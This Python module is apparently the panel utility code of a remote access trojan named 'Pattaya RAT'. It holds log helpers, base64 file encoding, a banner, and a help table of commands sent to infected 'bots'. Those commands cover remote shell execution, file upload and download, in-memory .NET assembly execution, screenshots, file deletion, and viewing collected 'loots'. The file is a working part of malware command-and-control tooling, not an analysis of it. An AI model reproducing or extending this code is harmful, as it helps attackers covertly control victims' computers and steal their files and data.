from datetime import datetime
from beautifultable import BeautifulTable
import base64


class PattayaPanelUtil:
    terminals = {}

    @staticmethod
    def setup(qtext_panel_browser, qtext_server_browser):
        PattayaPanelUtil._panel_log_viewer_instance = qtext_panel_browser
        PattayaPanelUtil._server_log_viewer_instance = qtext_server_browser
    
    @staticmethod
    def panel_log_info(message):
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        PattayaPanelUtil._panel_log_viewer_instance.append(f'<p style="color: #33FF52;">[{formatted_time}] - [INFO] - [{message}]</p>')
        PattayaPanelUtil._panel_log_viewer_instance.ensureCursorVisible()

    @staticmethod
    def panel_log_error(message):
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        PattayaPanelUtil._panel_log_viewer_instance.append(f'<p style="color: #E50A0A;">[{formatted_time}] - [ERROR] - [{message}]</p>')
        PattayaPanelUtil._panel_log_viewer_instance.ensureCursorVisible()


    @staticmethod
    def server_log_info(message):
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        PattayaPanelUtil._server_log_viewer_instance.append(f'<p style="color: #33FFF6;">[{formatted_time}] - [INFO] - [{message}]</p>')
        PattayaPanelUtil._server_log_viewer_instance.ensureCursorVisible()


    @staticmethod
    def get_terminal_help():
        table = BeautifulTable()
        table.rows.append(["help", "Get Pattaya help terminal"])
        table.rows.append(["pingbot", "Handshake with current bot"])
        table.rows.append(["killbot", "Shutdown/Kill current bot"])
        table.rows.append(["cd", "Change bot directory"])
        table.rows.append(["mkdir", "Create directory"])
        table.rows.append(["rmdir", "Delete directory"])
        table.rows.append(["ls", "List directory"])
        table.rows.append(["cat", "View file content"])
        table.rows.append(["rm", "Delete file"])
        table.rows.append(["ps", "List all processes"])
        table.rows.append(["pwd", "Print current working directory"])
        table.rows.append(["whoami", "Get current username"])
        table.rows.append(["shell", "Execute shell command"])
        table.rows.append(["upload", "Upload file to bot (limit file size to 10MB)"])
        table.rows.append(["download", "Download file from bot (limit file size to 10MB)"])
        table.rows.append(["execute-assembly", "Execute .Net assembly"])
        table.rows.append(["screenshot", "Capture bot screen"])
        table.rows.append(["openloots", "Open bot loots collection"])
        table.rows.append(["clear", "Clear terminal"])
        
        table.columns.header = ["Command", "Description"]
        return "All terminal commands list\n" + str(table)
    

    @staticmethod
    def base64_file_encode(file_name):
        with open(file_name, 'rb') as file:
            exe_bytes = file.read()

        base64_bytes = base64.b64encode(exe_bytes)
        base64_exe = base64_bytes.decode('utf-8')
        return base64_exe
    
    @staticmethod
    def base64_file_decode(base64string):
        return base64.b64decode(base64string)

    @staticmethod
    def get_banner(username, allow_command):
        return f"""

  _____      _   _                      _____         _______ 
 |  __ \    | | | |                    |  __ \     /\|__   __|
 | |__) |_ _| |_| |_ __ _ _   _  __ _  | |__) |   /  \  | |   
 |  ___/ _` | __| __/ _` | | | |/ _` | |  _  /   / /\ \ | |   
 | |  | (_| | |_| || (_| | |_| | (_| | | | \ \  / ____ \| |   
 |_|   \__,_|\__|\__\__,_|\__, |\__,_| |_|  \_\/_/    \_\_|   
                           __/ |                              
                          |___/                               
                                Welcome {username} to Pattaya Terminal :)

    Your allow command is {allow_command}
        """